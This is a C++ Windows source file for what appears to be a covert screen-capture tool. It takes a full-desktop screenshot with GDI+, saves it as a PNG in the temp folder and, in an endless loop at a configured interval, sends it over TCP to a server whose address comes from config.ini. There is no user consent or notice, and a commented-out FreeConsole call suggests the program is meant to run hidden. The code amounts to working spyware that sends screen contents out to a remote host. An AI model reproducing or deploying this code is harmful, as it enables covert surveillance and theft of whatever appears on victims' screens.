#pragma comment(lib, "Ws2_32.lib")
#include <Windows.h>
#include <string>
#include "log.hpp"
#include <vector>
#include <iostream>
#include <fstream>
#include <istream>
#include <SFML\Network.hpp>
#include <SFML\Graphics.hpp>
#include <SFML\System.hpp>
#include <SFML\Window.hpp>
#include <gdiplus.h>
#include <tchar.h>
#include "IniParser.hpp"
#include <direct.h>

#pragma comment (lib,"Gdiplus.lib")

using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
  UINT  num = 0;
  UINT  size = 0;
  Log log;
  ImageCodecInfo* pImageCodecInfo = NULL;
  GetImageEncodersSize(&num, &size);
  if (size == 0)
    return -1;  // Failure
  pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
  if (pImageCodecInfo == NULL)
    return -1;  // Failure
  if (GetImageEncoders(num, size, pImageCodecInfo) != Gdiplus::Status::Ok)
  {
    log.LogF("GetImageEncoders satus != ok");
  }
  for (UINT j = 0; j < num; ++j)
  {
    if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
    {
      *pClsid = pImageCodecInfo[j].Clsid;
      free(pImageCodecInfo);
      return j;  // Success
    }
  }
  free(pImageCodecInfo);
  return -1;  // Failure
}

void ScreenShot(const std::wstring& name)
{
  HWND desktopHwnd = GetDesktopWindow();
  RECT desktopParams;
  HDC devC = GetDC(desktopHwnd);
  Log log;
  if (GetWindowRect(desktopHwnd, &desktopParams) == FALSE)
  {
    log.LogF("Error: cannot get window rect");
  }
  DWORD width = desktopParams.right - desktopParams.left;
  DWORD height = desktopParams.bottom - desktopParams.top;
  HDC captureDC = CreateCompatibleDC(devC);
  HBITMAP captureBitmap = CreateCompatibleBitmap(devC, width, height);
  SelectObject(captureDC, captureBitmap);
  if (BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT) == FALSE)
  {
    log.LogF("Error: BitBlt");
  }
  Bitmap *p_bmp = Bitmap::FromHBITMAP(captureBitmap, NULL);
  CLSID encoderClsid;
  if (-1 == GetEncoderClsid(L"image/png", &encoderClsid))
  {
    log.LogF("Error: gdiplus get encoder ");
  }
  if (p_bmp->Save(name.c_str(), &encoderClsid, NULL) != Gdiplus::Status::Ok)
  {
    log.LogF("Error: gdiplus save png image status != Ok");
  }
  delete p_bmp;
}


int main()
{
  Gdiplus::GdiplusStartupInput gdiplusStartupInput;
  ULONG_PTR gdiplusToken;
  Log log;
  if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Status::Ok)
  {
    log.LogF("Error: gdiplus startup status != Ok");
  }
  //FreeConsole();
  IniParser inip(L".\\config.ini");
  std::wstring serverip;
  if (!inip.GetValue(serverip, L"serverip"))
  {
    log.LogF("Cannot read serverip from .ini file");
  }
  std::wstring winterval;
  if (!inip.GetValue(winterval, L"interval"))
  {
    log.LogF("Cannot read interval from .ini file");
  }
  std::wstring wport;
  if (!inip.GetValue(wport, L"port"))
  {
    log.LogF("Cannot read port from .ini file");
  }
  int port = _wtoi(wport.c_str());
  int interval = _wtoi(winterval.c_str());
  wchar_t tempPath[80];
  DWORD retval = GetTempPathW(80, tempPath);
  if (retval == 0)
  {
    log.LogF("Error at temp path: length = 0");
  }
  std::wstring name = std::wstring(tempPath) + L"image.png";
  std::string ip(serverip.begin(), serverip.end());

  while (true)
  {
    ScreenShot(name);
    sf::Packet packet;
    std::ifstream inputStream(name, std::ios::binary);
    if (inputStream.is_open())
    {
      sf::TcpSocket socket;
      sf::Socket::Status st = socket.connect(ip, port);
      if (st != sf::Socket::Status::Done)
      {
        log.LogF("Error: cannot connect to the server");
        continue;
      }
      std::string str((std::istreambuf_iterator<char>(inputStream)), std::istreambuf_iterator<char>());
      packet.append(&str[0], str.size());
      sf::Socket::Status status = socket.send(packet);
      if (status != sf::Socket::Status::Done)
      {
        log.LogF("Error: cannot send packet to the server");
      }
      else
      {
        log.LogF("Socket sended!");
      }
    }
    else
    {
      log.LogF("Error: cannot read the .img file");
    }
    log.LogF("Sleep!");
    Sleep(interval * 1000);
  }
  Gdiplus::GdiplusShutdown(gdiplusToken);
  return 0;
}